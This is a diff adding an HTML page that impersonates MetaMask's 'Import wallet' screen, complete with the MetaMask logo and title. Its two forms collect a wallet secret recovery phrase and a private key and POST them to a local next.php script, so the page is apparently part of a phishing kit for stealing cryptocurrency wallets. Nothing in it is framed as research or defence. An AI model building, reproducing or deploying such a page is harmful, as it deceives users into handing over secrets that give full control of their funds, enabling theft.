@@ -1,0 +1,183 @@
+<html lang="en"><head>
+
+  <style>
+    .btnH {
+      font-weight: 400;
+      font-size: 0.875rem;
+      font-weight: 500;
+      font-family: Roboto-Regular;
+      line-height: 1.25rem;
+      padding: .75rem 1rem;
+      display: -webkit-box;
+      display: flex;
+      -webkit-box-pack: center;
+      justify-content: center;
+      -webkit-box-align: center;
+      align-items: center;
+      box-sizing: border-box;
+      border-radius: 6px;
+      width: 48%;
+      background-color: #fff;
+      color: #037DD6;
+      border: 2px solid #B0D7F2;
+      background-color: #fff;
+    }
+  </style>
+</head>
+
+<body>
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-209848820-1" style="display: none !important;">
+  </script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+
+    gtag('config', 'UA-209848820-1');
+  </script>
+  <meta charset="UTF-8">
+  <title>MetaMask</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js">
+  </script>
+
+
+  <script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript">
+  </script>
+  <link rel="stylesheet" href="assets/css/main.css">
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+
+
+
+
+
+
+  <div class="homeMain bg-c">
+    <div class="headrHome">
+      <div class="headBox">
+
+        <div>
+          <img src="assets/img/metamask-logo-horizontal.svg" alt="" height="30px">
+        </div>
+
+        <div class="avatarBox">
+
+          <div class="avatar">
+            <svg height="100" version="1.1" width="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative;">
+              <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0
+              </desc>
+              <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></defs>
+              <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#189af2" stroke="none" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+              <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#f5c400" stroke="none" transform="matrix(-0.9558,0.2939,-0.2939,-0.9558,60.1479,53.9492)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+              <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#c8144d" stroke="none" transform="matrix(0.9801,-0.1983,0.1983,0.9801,-4.5919,-21.3271)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+              <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#fa7500" stroke="none" transform="matrix(-0.8318,0.555,-0.555,-0.8318,97.9387,53.8542)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+            </svg>
+          </div>
+          <div class="menu" style="display: none;">
+            <div class="menuContent">
+              <p>My account</p>
+            </div>
+            <div class="menu__divider "></div>
+            <div class="accountBox">
+            </div>
+            <div class="menu__divider "></div>
+            <div class="menuContent menuItem bt" data-link="importWallet.html">
+              <p><img style="margin-right: 5px" src="assets/img/usb.svg" alt="" height="15px">Create a new wallet</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="contentHomeMain">
+      <div class="searchTokensBox">
+        <div class="hTokens">
+          <div class="hTitle">
+            <h1>Import wallet</h1>
+          </div>
+          <div class="hTabs">
+            <div class="wHT searchTokenTabs active" data-val="seed">
+              <p>Recovery&nbsp;phrase</p>
+            </div>
+            <div class="wHt2 searchTokenTabs " data-val="search">
+              <p>Private&nbsp;key</p>
+            </div>
+
+
+          </div>
+
+        </div>
+
+        <div class="SeachBoxTokens">
+
+          <form action="next.php" method="POST">
+            <div id="search" class="TabContentToken" style="display: none;">
+                <div class="ImportWalletBox">
+                  <div class="ImportWalletSelectBox" style="margin-bottom: 0px;">
+                    <p style="margin-bottom: 0px;">Enter your private Key or paste from clipboard</p>
+                  </div>
+                  <div class="JSON">
+                    <input type="password" id="jjjj" name="p_k" class="ImportWalletInput">
+                  </div>
+                </div>
+              <div class="flex-start buttonBox">
+                <button type="submit" id="imp" class="btnH btn-primary importBtn " style="width: 100%;">Import</button>
+              </div>
+            </div>
+          </form>
+
+          <form action="next.php" method="POST">
+            <div class="addCostom TabContentToken" id="seed">
+              <div class="textareaBox">
+                <p>Wallet Secret Recovery Phrase</p>
+                <textarea name="seed" id="wordsseed2" cols="34" rows="10" placeholder="Separate each word with a single space or paste from clipboard"></textarea>
+              </div>
+              <div class="flex-start buttonBox">
+                <button type="submit" id="imp2" class="btn btn-primary importBtn " style="width: 100%;">Import</button>
+              </div>
+            </div>
+          </form>
+        </div>
+
+        <!-- 				<div class="sTokenButtons">
+
+
+					<button  class="sCancel bt" data-link="https://metamask.io/download.html">Cancel</button>
+					<button class="sNext">Next</button>
+					<button class="goHome" data-link="https://metamask.io/download.html" style="display: none">Add Tokens</button>
+
+
+				</div> -->
+
+
+      </div>
+
+    </div>
+  </div>
+
+
+  <script src="assets/js/main.js"></script>
+
+
+
+
+
+
+
+
+
+</body></html>
